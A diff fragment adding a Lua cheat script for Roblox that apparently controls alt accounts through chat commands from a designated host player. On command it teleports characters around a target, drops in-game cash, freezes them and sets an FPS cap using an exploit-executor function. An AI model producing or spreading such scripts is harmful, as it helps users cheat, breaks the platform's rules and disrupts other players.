+                            if v == player.UserId then
+                                index = index + 1
+                                local x,y,z = string.split(cords[index],",")[1],string.split(cords[index],",")[2],string.split(cords[index],",")[3]
+                                player.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.HumanoidRootPart.CFrame.X+tonumber(x),Target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),Target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
+                            else
+                                index = index + 1
+                            end
+                        end
+                        wait(2)
+                        Drop(true)
+                        Freeze(true)
+                    else
+                        Toggles['Cashauraing'] = true
+                    end
+                end
+            elseif msg[1] == Settings['Prefix'].."fps" then
+                if tonumber(msg[2]) then
+                    setfpscap(tonumber(msg[2]))
+                    saymsg("FPS set to "..msg[2])
+                end
+            end
+        end
+    end
+end
+
+game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData) 
+    local user = game:service"Players":GetPlayerByUserId(game.Players:GetUserIdFromNameAsync(messageData.FromSpeaker))
+    local msg = messageData.Message
+    if user.UserId == Settings['Host'] then
+        cmds(msg, user.UserId)
+    end
+end)
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-870, -38.39921188354492, -586)
+wait(.5)
+Freeze(true)
+local spawn
+local plr = game.Players.LocalPlayer
+
+spawn = plr.Character.HumanoidRootPart.CFrame 
+
+plr.CharacterAdded:Connect(function(char)
+if type(spawn) == "userdata" then
+    wait(.5)
+    char:WaitForChild'HumanoidRootPart'.CFrame = spawn
+end
+end)
